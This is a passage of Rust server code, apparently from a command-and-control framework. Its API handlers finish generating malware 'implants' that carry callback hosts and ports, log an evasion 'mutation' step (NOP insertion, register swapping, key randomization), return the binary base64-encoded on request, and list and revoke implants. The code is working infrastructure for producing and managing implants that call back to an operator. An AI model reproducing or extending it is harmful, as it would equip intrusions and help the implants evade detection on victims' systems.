        created_by: None, // TODO: extract from auth context
        expires_at: req.expires.clone(),
        callback_host: req.callback.clone(),
        callback_port: req.port,
        format: req.format.clone(),
        features_bitmap: req.features,
        keying_levels: req.keying,
        sha256: sha256.clone(),
        size_bytes: binary.len() as i64,
        revoked: false,
        notes: req.notes.clone(),
    };

    let id = implant_store.insert(&record).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("failed to store implant record: {e}"),
        )
    })?;

    // 7. Audit the generation event.
    if let Some(audit) = &st.audit {
        let mut detail = serde_json::json!({
            "implant_id": id,
            "implant_pub": hex::encode(implant_pub),
            "callback": req.callback,
            "port": req.port,
            "format": req.format,
            "sha256": sha256,
        });
        if let Some(ref report) = mutation_report {
            detail["mutation"] = serde_json::json!({
                "enabled": true,
                "nops_inserted": report.nops_inserted,
                "registers_swapped": report.registers_swapped,
                "keys_randomized": report.keys_randomized,
            });
        }
        audit.append("implant_generated", "system", "", detail);
    }

    tracing::info!(
        implant_id = id,
        implant_pub = %hex::encode(implant_pub),
        callback = %req.callback,
        format = %req.format,
        size = binary.len(),
        "implant generated"
    );

    Ok(Json(GenerateResponse {
        ok: true,
        implant_pub: hex::encode(implant_pub),
        sha256,
        size_bytes: binary.len(),
        format: req.format,
        message: Some(format!("implant {id} ready — {len} bytes", id = id, len = binary.len())),
        binary: if req.deliver.as_deref() == Some("inline") {
            use base64::{engine::general_purpose::STANDARD, Engine};
            Some(STANDARD.encode(&binary))
        } else {
            None
        },
    }))
}

/// `GET /api/implants` — list all generated implants.
pub async fn list_implants(
    State(st): State<Arc<AppState>>,
) -> Result<Json<ImplantListResponse>, (StatusCode, String)> {
    let store = st.implants.as_ref().ok_or_else(|| {
        (
            StatusCode::SERVICE_UNAVAILABLE,
            "no implant store".into(),
        )
    })?;

    let records = store.list().map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("failed to list implants: {e}"),
        )
    })?;

    let summaries: Vec<ImplantSummary> = records
        .into_iter()
        .map(|r| ImplantSummary {
            id: r.id,
            implant_pub: r.implant_pub,
            auth_token_used: r.auth_token_used,
            created_at: r.created_at,
            callback_host: r.callback_host,
            callback_port: r.callback_port,
            format: r.format,
            revoked: r.revoked,
            expires_at: r.expires_at,
        })
        .collect();

    Ok(Json(ImplantListResponse {
        ok: true,
        implants: summaries,
    }))
}

/// `POST /api/implant/revoke` — revoke an implant by pubkey.
#[derive(Debug, Deserialize)]
pub struct RevokeRequest {
    pub implant_pub: String,
}

pub async fn revoke_implant(
    State(st): State<Arc<AppState>>,
    Json(req): Json<RevokeRequest>,
) -> Result<Json<serde_json::Value>, (StatusCode, String)> {
    let store = st.implants.as_ref().ok_or_else(|| {
        (
            StatusCode::SERVICE_UNAVAILABLE,
            "no implant store".into(),
        )
    })?;

    let revoked = store.revoke(&req.implant_pub).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("failed to revoke implant: {e}"),
        )
    })?;

    if let Some(audit) = &st.audit {
        let detail = serde_json::json!({"implant_pub": &req.implant_pub});
        audit.append("implant_revoked", "system", "", detail);
    }

    Ok(Json(serde_json::json!({
        "ok": true,
        "revoked": revoked,
    })))
}
